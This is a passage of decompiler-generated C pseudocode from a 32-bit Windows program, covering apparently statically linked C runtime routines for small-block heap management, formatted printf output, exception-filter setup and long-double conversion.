          v12 = ~(0x80000000 >> (v7 - 32));
          result[v4 + 49] &= v12;
          v10 = (*v11)-- == 1;
          if ( v10 )
            a1[1] &= v12;
        }
        else
        {
          v8 = (char *)result + v7 + 4;
          v9 = ~(0x80000000 >> v7);
          result[v4 + 17] &= v9;
          v10 = (*v8)-- == 1;
          if ( v10 )
            *a1 &= v9;
        }
        v5 = v22;
        v6 = v23;
      }
      v5 += v20;
      *(_DWORD *)(*((_DWORD *)v6 + 2) + 4) = *((_DWORD *)v6 + 1);
      v22 = v5;
      *(_DWORD *)(*((_DWORD *)v23 + 1) + 8) = *((_DWORD *)v23 + 2);
    }
    v13 = (v5 >> 4) - 1;
    if ( v13 > 0x3F )
      v13 = 63;
    if ( (v21 & 1) != 0 )
    {
      v14 = (unsigned int)a1;
    }
    else
    {
      v24 = (int *)((char *)v3 - v21);
      v14 = (v21 >> 4) - 1;
      if ( v14 > 0x3F )
        v14 = 63;
      v22 = v21 + v5;
      v13 = ((v21 + v5) >> 4) - 1;
      if ( v13 > 0x3F )
        v13 = 63;
      if ( v14 != v13 )
      {
        if ( v24[1] == v24[2] )
        {
          if ( v14 >= 0x20 )
          {
            v16 = ~(0x80000000 >> (v14 - 32));
            result[v4 + 49] &= v16;
            v10 = (*((_BYTE *)result + v14 + 4))-- == 1;
            if ( v10 )
              a1[1] &= v16;
          }
          else
          {
            v15 = ~(0x80000000 >> v14);
            result[v4 + 17] &= v15;
            v10 = (*((_BYTE *)result + v14 + 4))-- == 1;
            if ( v10 )
              *a1 &= v15;
          }
        }
        *(_DWORD *)(v24[2] + 4) = v24[1];
        *(_DWORD *)(v24[1] + 8) = v24[2];
      }
      v3 = v24;
    }
    if ( (v21 & 1) != 0 || v14 != v13 )
    {
      v17 = &v19[2 * v13];
      v3[1] = v17[1];
      v3[2] = (int)v17;
      v17[1] = v3;
      *(_DWORD *)(v3[1] + 8) = v3;
      if ( v3[1] == v3[2] )
      {
        v25 = *((_BYTE *)result + v13 + 4);
        *((_BYTE *)result + v13 + 4) = v25 + 1;
        if ( v13 >= 0x20 )
        {
          if ( !v25 )
            a1[1] |= 0x80000000 >> (v13 - 32);
          result[v4 + 49] |= 0x80000000 >> (v13 - 32);
        }
        else
        {
          if ( !v25 )
            *a1 |= 0x80000000 >> v13;
          result[v4 + 17] |= 0x80000000 >> v13;
        }
      }
    }
    *v3 = v22;
    *(int *)((char *)v3 + v22 - 4) = v22;
    result += 129 * v4 + 81;
    v10 = (*v19)-- == 1;
    if ( v10 )
    {
      if ( dword_445CF8 )
      {
        VirtualFree((LPVOID)(*((_DWORD *)dword_445CF8 + 3) + (dword_445CF0 << 15)), 0x8000u, 0x4000u);
        *((_DWORD *)dword_445CF8 + 2) |= 0x80000000 >> dword_445CF0;
        *(_DWORD *)(*((_DWORD *)dword_445CF8 + 4) + 4 * dword_445CF0 + 196) = 0;
        --*(_BYTE *)(*((_DWORD *)dword_445CF8 + 4) + 67);
        v18 = (LPVOID *)dword_445CF8;
        if ( !*(_BYTE *)(*((_DWORD *)dword_445CF8 + 4) + 67) )
        {
          *((_DWORD *)dword_445CF8 + 1) &= ~1u;
          v18 = (LPVOID *)dword_445CF8;
        }
        if ( v18[2] == (LPVOID)-1 )
        {
          VirtualFree(v18[3], 0, 0x8000u);
          HeapFree(dword_445D08, 0, *((LPVOID *)dword_445CF8 + 4));
          memcpy(dword_445CF8, (char *)dword_445CF8 + 20, (size_t)lpMem + 20 * dword_445CFC - (_DWORD)dword_445CF8 - 20);
          --dword_445CFC;
          if ( a1 > dword_445CF8 )
            a1 -= 5;
          dword_445CF4 = (int)lpMem;
        }
      }
      result = a1;
      dword_445CF0 = v4;
      dword_445CF8 = a1;
    }
  }
  return result;
}
// 445CF0: using guessed type int dword_445CF0;
// 445CF4: using guessed type int dword_445CF4;
// 445CFC: using guessed type int dword_445CFC;

//----- (0041032A) --------------------------------------------------------
void **sub_41032A()
{
  void **v0; // esi
  _DWORD *v1; // eax
  _DWORD *v2; // edi
  int *v3; // eax
  int v4; // ebp
  int v5; // edx

  if ( dword_426FF8 == -1 )
  {
    v0 = &off_426FE8;
  }
  else
  {
    v0 = (void **)HeapAlloc(dword_445D08, 0, 0x2020u);
    if ( !v0 )
      return 0;
  }
  v1 = VirtualAlloc(0, 0x400000u, 0x2000u, 4u);
  v2 = v1;
  if ( !v1 )
  {
LABEL_19:
    if ( v0 != &off_426FE8 )
      HeapFree(dword_445D08, 0, v0);
    return 0;
  }
  if ( !VirtualAlloc(v1, 0x10000u, 0x1000u, 4u) )
  {
    VirtualFree(v2, 0, 0x8000u);
    goto LABEL_19;
  }
  if ( v0 == &off_426FE8 )
  {
    if ( !off_426FE8 )
      off_426FE8 = &off_426FE8;
    if ( !off_426FEC )
      off_426FEC = &off_426FE8;
  }
  else
  {
    *v0 = &off_426FE8;
    v0[1] = off_426FEC;
    off_426FEC = v0;
    *(_DWORD *)v0[1] = v0;
  }
  v0[5] = v2 + 0x100000;
  v3 = (int *)(v0 + 6);
  v0[3] = v0 + 38;
  v0[4] = v2;
  v0[2] = v0 + 6;
  v4 = 0;
  do
  {
    v5 = v4++ >= 16 ? -1 : 240;
    *v3 = v5;
    v3[1] = 241;
    v3 += 2;
  }
  while ( v4 < 1024 );
  memset(v2, 0, 0x10000u);
  while ( v2 < (_DWORD *)((char *)v0[4] + 0x10000) )
  {
    *((_BYTE *)v2 + 248) = -1;
    *v2 = v2 + 2;
    v2[1] = 240;
    v2 += 1024;
  }
  return v0;
}
// 426FE8: using guessed type void *off_426FE8;
// 426FF8: using guessed type int dword_426FF8;

//----- (0041046E) --------------------------------------------------------
void **__cdecl sub_41046E(void **lpMem)
{
  void **result; // eax

  result = (void **)VirtualFree(lpMem[4], 0, 0x8000u);
  if ( off_429008 == lpMem )
  {
    result = (void **)lpMem[1];
    off_429008 = result;
  }
  if ( lpMem == &off_426FE8 )
  {
    dword_426FF8 = -1;
  }
  else
  {
    *(_DWORD *)lpMem[1] = *lpMem;
    *((_DWORD *)*lpMem + 1) = lpMem[1];
    return (void **)HeapFree(dword_445D08, 0, lpMem);
  }
  return result;
}
// 426FE8: using guessed type void *off_426FE8;
// 426FF8: using guessed type int dword_426FF8;
// 429008: using guessed type void **off_429008;

//----- (004104C4) --------------------------------------------------------
void __cdecl sub_4104C4(int a1)
{
  _DWORD *v1; // esi
  _DWORD *v2; // edi
  int i; // ebx
  unsigned int v4; // eax
  _DWORD *v5; // ecx
  _DWORD *v6; // eax
  int j; // edx
  int v8; // [esp+Ch] [ebp-4h]

  v1 = off_426FEC;
  do
  {
    if ( v1[4] != -1 )
    {
      v8 = 0;
      v2 = v1 + 2052;
      for ( i = 4190208; i >= 0; i -= 4096 )
      {
        if ( *v2 == 240 && VirtualFree((LPVOID)(v1[4] + i), 0x1000u, 0x4000u) )
        {
          *v2 = -1;
          --dword_4449C4;
          v4 = v1[3];
          if ( !v4 || v4 > (unsigned int)v2 )
            v1[3] = v2;
          ++v8;
          if ( !--a1 )
            break;
        }
        v2 -= 2;
      }
      v5 = v1;
      v1 = (_DWORD *)v1[1];
      if ( v8 && v5[6] == -1 )
      {
        v6 = v5 + 8;
        for ( j = 1; j < 1024; ++j )
        {
          if ( *v6 != -1 )
            break;
          v6 += 2;
        }
        if ( j == 1024 )
          sub_41046E((void **)v5);
      }
    }
  }
  while ( v1 != off_426FEC && a1 > 0 );
}
// 4449C4: using guessed type int dword_4449C4;

//----- (00410586) --------------------------------------------------------
unsigned int __cdecl sub_410586(unsigned int a1, void ***a2, unsigned int *a3)
{
  void **v3; // ecx

  v3 = &off_426FE8;
  while ( a1 <= (unsigned int)v3[4] || a1 >= (unsigned int)v3[5] )
  {
    v3 = (void **)*v3;
    if ( v3 == &off_426FE8 )
      return 0;
  }
  if ( (a1 & 0xF) == 0 && (a1 & 0xFFF) >= 0x100 )
  {
    *a2 = v3;
    *a3 = a1 & 0xFFFFF000;
    return ((int)(a1 - (a1 & 0xFFFFF000) - 256) >> 4) + (a1 & 0xFFFFF000) + 8;
  }
  return 0;
}
// 426FE8: using guessed type void *off_426FE8;

//----- (004105DD) --------------------------------------------------------
void __cdecl sub_4105DD(int a1, int a2, _BYTE *a3)
{
  _DWORD *v3; // eax
  bool v4; // zf

  v3 = (_DWORD *)(a1 + 8 * ((a2 - *(_DWORD *)(a1 + 16)) >> 12) + 24);
  *v3 += (unsigned __int8)*a3;
  *a3 = 0;
  v4 = *v3 == 240;
  v3[1] = 241;
  if ( v4 && ++dword_4449C4 == 32 )
    sub_4104C4(16);
}
// 4449C4: using guessed type int dword_4449C4;

//----- (00410622) --------------------------------------------------------
int __cdecl sub_410622(unsigned int a1)
{
  void **v1; // esi
  void *v2; // edx
  unsigned int *v3; // edi
  int v4; // eax
  unsigned int v5; // ebx
  int result; // eax
  void **v7; // edi
  _DWORD *v8; // ebx
  _DWORD *v9; // eax
  _DWORD *i; // esi
  void **v11; // ecx
  _DWORD *v12; // eax
  void **v13; // eax
  bool v14; // cf
  void **v15; // eax
  _BYTE *v16; // ecx
  unsigned int Val; // [esp+Ch] [ebp-8h]
  int v18; // [esp+10h] [ebp-4h]
  int v19; // [esp+10h] [ebp-4h]
  int v20; // [esp+10h] [ebp-4h]

  v1 = off_429008;
  do
  {
    v2 = v1[4];
    if ( v2 == (void *)-1 )
    {
      v5 = a1;
    }
    else
    {
      v3 = (unsigned int *)v1[2];
      v4 = (int)v2 + 4096 * (((char *)v3 - (char *)v1 - 24) >> 3);
      v18 = v4;
      if ( v3 < (unsigned int *)v1 + 2054 )
      {
        while ( 1 )
        {
          v5 = a1;
          if ( (int)*v3 >= (int)a1 && v3[1] > a1 )
          {
            result = sub_41082A(v4, *v3, a1);
            if ( result )
            {
LABEL_21:
              off_429008 = v1;
              *v3 -= v5;
              v1[2] = v3;
              return result;
            }
            v4 = v18;
            v3[1] = a1;
          }
          v3 += 2;
          v4 += 4096;
          v18 = v4;
          if ( v3 >= (unsigned int *)v1 + 2054 )
            goto LABEL_11;
        }
      }
      v5 = a1;
LABEL_11:
      v3 = (unsigned int *)(v1 + 6);
      Val = (unsigned int)v1[2];
      v19 = (int)v1[4];
      if ( (unsigned int)(v1 + 6) < Val )
      {
        do
        {
          if ( (int)*v3 >= (int)v5 && v3[1] > v5 )
          {
            result = sub_41082A(v19, *v3, v5);
            if ( result )
              goto LABEL_21;
            v3[1] = v5;
          }
          v19 += 4096;
          v3 += 2;
        }
        while ( (unsigned int)v3 < Val );
      }
    }
    v1 = (void **)*v1;
  }
  while ( v1 != off_429008 );
  v7 = &off_426FE8;
  while ( v7[4] == (void *)-1 || !v7[3] )
  {
    v7 = (void **)*v7;
    if ( v7 == &off_426FE8 )
    {
      v15 = sub_41032A();
      if ( v15 )
      {
        v16 = v15[4];
        v16[8] = v5;
        off_429008 = v15;
        *(_DWORD *)v16 = &v16[v5 + 8];
        *((_DWORD *)v16 + 1) = 240 - v5;
        v15[6] = (char *)v15[6] - (unsigned __int8)v5;
        return (int)(v16 + 256);
      }
      return 0;
    }
  }
  v8 = v7[3];
  v20 = 0;
  v9 = v8;
  for ( i = (char *)v7[4] + 4096 * (((char *)v8 - (char *)v7 - 24) >> 3); *v9 == -1; ++v20 )
  {
    if ( v20 >= 16 )
      break;
    v9 += 2;
  }
  if ( VirtualAlloc(i, v20 << 12, 0x1000u, 4u) != i )
    return 0;
  v11 = (void **)v8;
  if ( v20 > 0 )
  {
    v12 = i + 1;
    do
    {
      *((_BYTE *)v12 + 244) = -1;
      *(v12 - 1) = v12 + 1;
      *v12 = 240;
      *v11 = (void *)240;
      v11[1] = (void *)241;
      v12 += 1024;
      v11 += 2;
      --v20;
    }
    while ( v20 );
  }
  off_429008 = v7;
  v13 = v7 + 2054;
  while ( 1 )
  {
    v14 = v11 < v13;
    if ( v11 >= v13 )
      break;
    if ( *v11 == (void *)-1 )
    {
      v14 = v11 < v13;
      break;
    }
    v11 += 2;
  }
  v7[3] = v14 ? v11 : 0;
  *((_BYTE *)i + 8) = a1;
  v7[2] = v8;
  *v8 -= a1;
  i[1] -= a1;
  result = (int)(i + 64);
  *i = (char *)i + a1 + 8;
  return result;
}
// 426FE8: using guessed type void *off_426FE8;
// 429008: using guessed type void **off_429008;

//----- (0041082A) --------------------------------------------------------
int __cdecl sub_41082A(int a1, unsigned int a2, unsigned int a3)
{
  unsigned int v4; // esi
  _BYTE *v5; // edi
  unsigned int v6; // ebx
  _BYTE *v7; // eax
  _BYTE *v8; // eax
  _BYTE *v9; // esi
  _BYTE *v10; // ebx
  unsigned int v11; // esi
  _BYTE *v12; // esi
  _BYTE *v13; // ebx
  unsigned int v14; // eax
  _BYTE *v16; // [esp+Ch] [ebp-4h]
  unsigned int v17; // [esp+18h] [ebp+8h]

  v4 = *(_DWORD *)(a1 + 4);
  v5 = *(_BYTE **)a1;
  v6 = a1 + 248;
  v16 = *(_BYTE **)a1;
  v7 = *(_BYTE **)a1;
  v17 = a1 + 248;
  if ( v4 >= a3 )
  {
    *v5 = a3;
    if ( (unsigned int)&v5[a3] >= v6 )
    {
      *(_DWORD *)(a1 + 4) = 0;
      *(_DWORD *)a1 = a1 + 8;
    }
    else
    {
      *(_DWORD *)a1 += a3;
      *(_DWORD *)(a1 + 4) -= a3;
    }
    v8 = v5 + 8;
    return 16 * (_DWORD)v8 - 15 * a1;
  }
  v9 = &v5[v4];
  if ( *v9 )
    v7 = v9;
  if ( (unsigned int)&v7[a3] >= v6 )
  {
LABEL_20:
    v12 = (_BYTE *)(a1 + 8);
    while ( v12 < v5 && (unsigned int)&v12[a3] < v17 )
    {
      if ( *v12 )
      {
        v12 += (unsigned __int8)*v12;
      }
      else
      {
        v13 = v12 + 1;
        v14 = 1;
        while ( !*v13 )
        {
          ++v13;
          ++v14;
        }
        if ( v14 >= a3 )
        {
          if ( (unsigned int)&v12[a3] >= v17 )
          {
            *(_DWORD *)(a1 + 4) = 0;
            *(_DWORD *)a1 = a1 + 8;
          }
          else
          {
            *(_DWORD *)a1 = &v12[a3];
            *(_DWORD *)(a1 + 4) = v14 - a3;
          }
          *v12 = a3;
          v8 = v12 + 8;
          return 16 * (_DWORD)v8 - 15 * a1;
        }
        a2 -= v14;
        if ( a2 < a3 )
          return 0;
        v12 = v13;
      }
    }
    return 0;
  }
  while ( *v7 )
  {
    v7 += (unsigned __int8)*v7;
LABEL_19:
    if ( (unsigned int)&v7[a3] >= v17 )
      goto LABEL_20;
  }
  v10 = v7 + 1;
  v11 = 1;
  while ( !*v10 )
  {
    ++v10;
    ++v11;
  }
  if ( v11 < a3 )
  {
    if ( v7 == v16 )
    {
      *(_DWORD *)(a1 + 4) = v11;
    }
    else
    {
      a2 -= v11;
      if ( a2 < a3 )
        return 0;
    }
    v5 = v16;
    v7 = v10;
    goto LABEL_19;
  }
  if ( (unsigned int)&v7[a3] >= v17 )
  {
    *(_DWORD *)(a1 + 4) = 0;
    *(_DWORD *)a1 = a1 + 8;
  }
  else
  {
    *(_DWORD *)a1 = &v7[a3];
    *(_DWORD *)(a1 + 4) = v11 - a3;
  }
  *v7 = a3;
  v8 = v7 + 8;
  return 16 * (_DWORD)v8 - 15 * a1;
}

//----- (0041094E) --------------------------------------------------------
int __cdecl sub_41094E(int a1, _DWORD *a2, _BYTE *a3, unsigned int a4)
{
  unsigned int v4; // ecx
  _DWORD *v5; // edi
  _BYTE *v6; // esi
  _BYTE *i; // eax
  bool v8; // zf
  int v9; // eax
  int v11; // [esp+Ch] [ebp-4h]

  v4 = (unsigned __int8)*a3;
  v11 = 0;
  v5 = (_DWORD *)(a1 + 8 * (((int)a2 - *(_DWORD *)(a1 + 16)) >> 12) + 24);
  if ( v4 > a4 )
  {
    *a3 = a4;
    *v5 += v4 - a4;
    v5[1] = 241;
    return 1;
  }
  if ( v4 < a4 )
  {
    v6 = &a3[a4];
    if ( &a3[a4] <= (_BYTE *)a2 + 248 )
    {
      for ( i = &a3[v4]; ; ++i )
      {
        v8 = i == v6;
        if ( i >= v6 )
          break;
        if ( *i )
        {
          v8 = i == v6;
          break;
        }
      }
      if ( v8 )
      {
        *a3 = a4;
        if ( (unsigned int)a3 <= *a2 && (unsigned int)v6 > *a2 )
        {
          if ( v6 >= (_BYTE *)a2 + 248 )
          {
            a2[1] = 0;
            *a2 = a2 + 2;
          }
          else
          {
            v9 = 0;
            *a2 = v6;
            if ( !*v6 )
            {
              do
                ++v9;
              while ( !v6[v9] );
            }
            a2[1] = v9;
          }
        }
        *v5 += v4 - a4;
        return 1;
      }
    }
  }
  return v11;
}

//----- (00411068) --------------------------------------------------------
int __cdecl sub_411068(FILE *File, char *a2, int a3)
{
  int v3; // ecx
  char v4; // bl
  char *v5; // esi
  bool v6; // zf
  int v7; // eax
  int int_arg; // eax
  int v9; // eax
  int v10; // esi
  int v11; // eax
  char *v12; // ecx
  char *i; // eax
  int v14; // edx
  char *v15; // edi
  wchar_t short_arg; // ax
  __int16 *v17; // eax
  int v18; // ecx
  int v19; // eax
  int v20; // eax
  void *v21; // eax
  char *j; // eax
  int v23; // edx
  _WORD *v24; // eax
  __int64 v25; // rax
  int v26; // eax
  int v27; // ebx
  _BYTE *v28; // eax
  char *v29; // eax
  char v30; // bl
  int v31; // esi
  wchar_t *v32; // ebx
  int v33; // edi
  wchar_t v34; // ax
  int v35; // eax
  char MbCh[511]; // [esp+Ch] [ebp-24Ch] BYREF
  char v39; // [esp+20Bh] [ebp-4Dh] BYREF
  int v40[2]; // [esp+20Ch] [ebp-4Ch] BYREF
  char v41[4]; // [esp+214h] [ebp-44h] BYREF
  int v42; // [esp+218h] [ebp-40h]
  int v43; // [esp+21Ch] [ebp-3Ch]
  int v44; // [esp+220h] [ebp-38h]
  int v45; // [esp+224h] [ebp-34h]
  LPVOID lpMem; // [esp+228h] [ebp-30h]
  int v47; // [esp+22Ch] [ebp-2Ch]
  int v48; // [esp+230h] [ebp-28h]
  int v49; // [esp+234h] [ebp-24h]
  unsigned __int64 v50; // [esp+238h] [ebp-20h]
  _WORD v51[3]; // [esp+242h] [ebp-16h] BYREF
  int v52; // [esp+248h] [ebp-10h]
  int v53; // [esp+24Ch] [ebp-Ch]
  int v54; // [esp+250h] [ebp-8h]
  int v55; // [esp+254h] [ebp-4h]
  char *v56; // [esp+264h] [ebp+Ch]

  v3 = 0;
  v52 = 0;
  v4 = *a2;
  v5 = a2 + 1;
  v6 = *a2 == 0;
  *(_DWORD *)&v51[1] = 0;
  lpMem = 0;
  v56 = a2 + 1;
  if ( !v6 )
  {
    while ( 1 )
    {
      if ( *(int *)&v51[1] < 0 )
        return *(_DWORD *)&v51[1];
      if ( v4 < 32 || v4 > 120 )
        v7 = 0;
      else
        v7 = aIsprocessorfea[v4 + 16] & 0xF;
      v43 = byte_420650[8 * v7 + v3] >> 4;
      switch ( v43 )
      {
        case 0:
          goto LABEL_42;
        case 1:
          v54 = -1;
          v42 = 0;
          v44 = 0;
          v48 = 0;
          v49 = 0;
          v55 = 0;
          v47 = 0;
          goto LABEL_179;
        case 2:
          switch ( v4 )
          {
            case ' ':
              v55 |= 2u;
              break;
            case '#':
              LOBYTE(v55) = v55 | 0x80;
              break;
            case '+':
              v55 |= 1u;
              break;
            case '-':
              v55 |= 4u;
              break;
            case '0':
              v55 |= 8u;
              break;
          }
          goto LABEL_179;
        case 3:
          if ( v4 == 42 )
          {
            int_arg = get_int_arg(&a3);
            v48 = int_arg;
            if ( int_arg >= 0 )
              goto LABEL_179;
            v55 |= 4u;
            v9 = -int_arg;
          }
          else
          {
            v9 = v4 + 10 * v48 - 48;
          }
          v48 = v9;
          goto LABEL_179;
        case 4:
          v54 = 0;
          goto LABEL_179;
        case 5:
          if ( v4 == 42 )
          {
            v54 = get_int_arg(&a3);
            if ( v54 < 0 )
              v54 = -1;
          }
          else
          {
            v54 = v4 + 10 * v54 - 48;
          }
          goto LABEL_179;
        case 6:
          switch ( v4 )
          {
            case 'I':
              if ( *v5 == 54 && v5[1] == 52 )
              {
                BYTE1(v55) |= 0x80u;
                v56 = v5 + 2;
              }
              else
              {
                v43 = 0;
LABEL_42:
                v47 = 0;
                if ( *((char *)off_4291FC + 2 * (unsigned __int8)v4 + 1) < 0 )
                {
                  write_char(v4, File, (int)&v51[1]);
                  v4 = *v5;
                  v56 = v5 + 1;
                }
                write_char(v4, File, (int)&v51[1]);
              }
              break;
            case 'h':
              v55 |= 0x20u;
              break;
            case 'l':
              v55 |= 0x10u;
              break;
            case 'w':
              v55 |= 0x800u;
              break;
          }
          goto LABEL_179;
        case 7:
          if ( v4 > 103 )
          {
            switch ( v4 )
            {
              case 'i':
                goto LABEL_119;
              case 'n':
                v24 = (_WORD *)get_int_arg(&a3);
                if ( (v55 & 0x20) != 0 )
                  *v24 = v51[1];
                else
                  *(_DWORD *)v24 = *(_DWORD *)&v51[1];
                v44 = 1;
                goto LABEL_177;
              case 'o':
                v52 = 8;
                if ( (v55 & 0x80u) != 0 )
                  v55 |= 0x200u;
                break;
              default:
                switch ( v4 )
                {
                  case 'p':
                    v54 = 8;
LABEL_110:
                    v45 = 7;
                    break;
                  case 's':
                    goto LABEL_55;
                  case 'u':
                    goto LABEL_120;
                  case 'x':
                    v45 = 39;
                    break;
                  default:
                    goto LABEL_154;
                }
                v52 = 16;
                if ( (v55 & 0x80u) != 0 )
                {
                  LOBYTE(v51[0]) = 48;
                  v49 = 2;
                  HIBYTE(v51[0]) = v45 + 81;
                }
                break;
            }
LABEL_121:
            if ( (v55 & 0x8000) == 0 )
            {
              if ( (v55 & 0x20) != 0 )
              {
                if ( (v55 & 0x40) != 0 )
                  LODWORD(v25) = (__int16)get_int_arg(&a3);
                else
                  LODWORD(v25) = (unsigned __int16)get_int_arg(&a3);
              }
              else
              {
                if ( (v55 & 0x40) == 0 )
                {
                  v25 = (unsigned int)get_int_arg(&a3);
                  goto LABEL_131;
                }
                LODWORD(v25) = get_int_arg(&a3);
              }
              v25 = (int)v25;
            }
            else
            {
              LODWORD(v25) = get_int64_arg(&a3);
            }
LABEL_131:
            if ( (v55 & 0x40) != 0 && v25 < 0 )
            {
              BYTE1(v55) |= 1u;
              v50 = -v25;
            }
            else
            {
              v50 = v25;
            }
            if ( (v55 & 0x8000) == 0 )
              HIDWORD(v50) = 0;
            if ( v54 >= 0 )
            {
              v55 &= ~8u;
              if ( v54 > 512 )
                v54 = 512;
            }
            else
            {
              v54 = 1;
            }
            if ( !v50 )
              v49 = 0;
            v53 = (int)&v39;
            while ( 1 )
            {
              v26 = v54--;
              if ( v26 <= 0 && !v50 )
                break;
              v27 = v50 % v52 + 48;
              v50 /= (unsigned __int64)v52;
              if ( v27 > 57 )
                LOBYTE(v27) = v45 + v27;
              v28 = (_BYTE *)v53--;
              *v28 = v27;
            }
            v29 = &v39 - v53++;
            v52 = (int)v29;
            if ( (v55 & 0x200) != 0 && (*(_BYTE *)v53 != 48 || !v29) )
            {
              --v53;
              v20 = (int)(v29 + 1);
              *(_BYTE *)v53 = 48;
              goto LABEL_153;
            }
            goto LABEL_154;
          }
          if ( v4 >= 101 )
            goto LABEL_65;
          if ( v4 > 88 )
          {
            if ( v4 == 90 )
            {
              v17 = (__int16 *)get_int_arg(&a3);
              if ( v17 && (v18 = *((_DWORD *)v17 + 1)) != 0 )
              {
                if ( (v55 & 0x800) != 0 )
                {
                  v19 = (unsigned int)*v17 >> 1;
                  v53 = v18;
                  v52 = v19;
                  v47 = 1;
                  goto LABEL_154;
                }
                v47 = 0;
                v53 = v18;
                v20 = *v17;
              }
              else
              {
                v53 = (int)off_4290E8;
                v20 = strlen(off_4290E8);
              }
              goto LABEL_153;
            }
            if ( v4 == 99 )
              goto LABEL_69;
            if ( v4 != 100 )
              goto LABEL_154;
LABEL_119:
            v55 |= 0x40u;
LABEL_120:
            v52 = 10;
            goto LABEL_121;
          }
          switch ( v4 )
          {
            case 'X':
              goto LABEL_110;
            case 'C':
              if ( (v55 & 0x830) == 0 )
                v55 |= 0x800u;
LABEL_69:
              if ( (v55 & 0x810) != 0 )
              {
                short_arg = get_short_arg(&a3);
                v52 = wctomb(MbCh, short_arg);
                if ( v52 < 0 )
                  v44 = 1;
              }
              else
              {
                MbCh[0] = get_int_arg(&a3);
                v52 = 1;
              }
              v53 = (int)MbCh;
              goto LABEL_154;
            case 'E':
            case 'G':
              v42 = 1;
              v4 += 32;
LABEL_65:
              v55 |= 0x40u;
              v15 = MbCh;
              v53 = (int)MbCh;
              if ( v54 >= 0 )
              {
                if ( v54 )
                {
                  if ( v54 > 512 )
                    v54 = 512;
                  if ( v54 > 163 )
                  {
                    v21 = malloc(v54 + 349);
                    lpMem = v21;
                    if ( v21 )
                    {
                      v15 = (char *)v21;
                      v53 = (int)v21;
                    }
                    else
                    {
                      v54 = 163;
                    }
                  }
                }
                else
                {
                  v54 = v4 == 103;
                }
              }
              else
              {
                v54 = 6;
              }
              a3 += 8;
              v40[0] = *(_DWORD *)(a3 - 8);
              v40[1] = *(_DWORD *)(a3 - 4);
              off_4290D0(v40, v15, v4, v54, v42);
              break;
          }
          if ( v4 == 83 )
          {
            if ( (v55 & 0x830) == 0 )
              v55 |= 0x800u;
LABEL_55:
            v10 = 0x7FFFFFFF;
            if ( v54 != -1 )
              v10 = v54;
            v11 = get_int_arg(&a3);
            v12 = (char *)v11;
            v53 = v11;
            if ( (v55 & 0x810) != 0 )
            {
              if ( !v11 )
              {
                v12 = (char *)off_4290EC;
                v53 = (int)off_4290EC;
              }
              v47 = 1;
              for ( i = v12; ; i += 2 )
              {
                v14 = v10--;
                if ( !v14 || !*(_WORD *)i )
                  break;
              }
              v20 = (i - v12) >> 1;
            }
            else
            {
              if ( !v11 )
              {
                v12 = off_4290E8;
                v53 = (int)off_4290E8;
              }
              for ( j = v12; ; ++j )
              {
                v23 = v10--;
                if ( !v23 || !*j )
                  break;
              }
              v20 = j - v12;
            }
LABEL_153:
            v52 = v20;
          }
LABEL_154:
          if ( v44 )
            goto LABEL_177;
          v30 = v55;
          if ( (v55 & 0x40) == 0 )
            goto LABEL_163;
          if ( (v55 & 0x100) != 0 )
          {
            LOBYTE(v51[0]) = 45;
LABEL_162:
            v49 = 1;
            goto LABEL_163;
          }
          if ( (v55 & 1) != 0 )
          {
            LOBYTE(v51[0]) = 43;
            goto LABEL_162;
          }
          if ( (v55 & 2) != 0 )
          {
            LOBYTE(v51[0]) = 32;
            goto LABEL_162;
          }
LABEL_163:
          v31 = v48 - v49 - v52;
          if ( (v55 & 0xC) == 0 )
            write_multi_char(32, v48 - v49 - v52, File, (int)&v51[1]);
          write_string((int)v51, v49, File, (int)&v51[1]);
          if ( (v30 & 8) != 0 && (v30 & 4) == 0 )
            write_multi_char(48, v31, File, (int)&v51[1]);
          if ( v47 && v52 > 0 )
          {
            v32 = (wchar_t *)v53;
            v33 = v52 - 1;
            do
            {
              v34 = *v32++;
              v35 = wctomb(v41, v34);
              if ( v35 <= 0 )
                break;
              write_string((int)v41, v35, File, (int)&v51[1]);
            }
            while ( v33-- );
          }
          else
          {
            write_string(v53, v52, File, (int)&v51[1]);
          }
          if ( (v55 & 4) != 0 )
            write_multi_char(32, v31, File, (int)&v51[1]);
LABEL_177:
          if ( lpMem )
          {
            sub_40AD16(lpMem);
            lpMem = 0;
          }
LABEL_179:
          v4 = *v56;
          v5 = v56 + 1;
          v6 = *v56++ == 0;
          if ( v6 )
            return *(_DWORD *)&v51[1];
          v3 = v43;
          break;
        default:
          goto LABEL_179;
      }
    }
  }
  return *(_DWORD *)&v51[1];
}
// 4115E3: variable 'v25' is possibly undefined
// 4118A4: using guessed type _DWORD __cdecl get_int_arg(_DWORD);
// 4118B1: using guessed type _DWORD __cdecl get_int64_arg(_DWORD);
// 4118C1: using guessed type _DWORD __cdecl get_short_arg(_DWORD);
// 4290D0: using guessed type int (__cdecl *off_4290D0)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 4290EC: using guessed type wchar_t *off_4290EC;
// 4291FC: using guessed type void *off_4291FC;
// 411068: using guessed type char var_44[4];

//----- (00411E16) --------------------------------------------------------
LONG (__stdcall *sub_411E16())(struct _EXCEPTION_POINTERS *ExceptionInfo)
{
  LONG (__stdcall *result)(struct _EXCEPTION_POINTERS *); // eax

  result = SetUnhandledExceptionFilter(__CxxUnhandledExceptionFilter);
  lpfn = result;
  return result;
}

//----- (00411E27) --------------------------------------------------------
LPTOP_LEVEL_EXCEPTION_FILTER sub_411E27()
{
  return SetUnhandledExceptionFilter(lpfn);
}

//----- (004133D4) --------------------------------------------------------
int __cdecl sub_4133D4(int a1, int a2)
{
  return _ld12cvt(a1, a2, &unk_4298E8);
}
// 413268: using guessed type _DWORD __cdecl _ld12cvt(_DWORD, _DWORD, _DWORD);

//----- (004133EA) --------------------------------------------------------
int __cdecl sub_4133EA(int a1, int a2)
{
  return _ld12cvt(a1, a2, &unk_429900);
}
// 413268: using guessed type _DWORD __cdecl _ld12cvt(_DWORD, _DWORD, _DWORD);

//----- (00413400) --------------------------------------------------------
int __cdecl sub_413400(int a1, int a2)
{
  char v3[12]; // [esp+0h] [ebp-Ch] BYREF

  __strgtold12(v3, &a2, a2, 0, 0, 0, 0);
  return sub_4133D4((int)v3, a1);
}
// 413B9C: using guessed type _DWORD __cdecl __strgtold12(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (0041342D) --------------------------------------------------------
int __cdecl sub_41342D(int a1, int a2)
{
  char v3[12]; // [esp+0h] [ebp-Ch] BYREF

  __strgtold12(v3, &a2, a2, 0, 0, 0, 0);
  return sub_4133EA((int)v3, a1);
}
// 413B9C: using guessed type _DWORD __cdecl __strgtold12(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

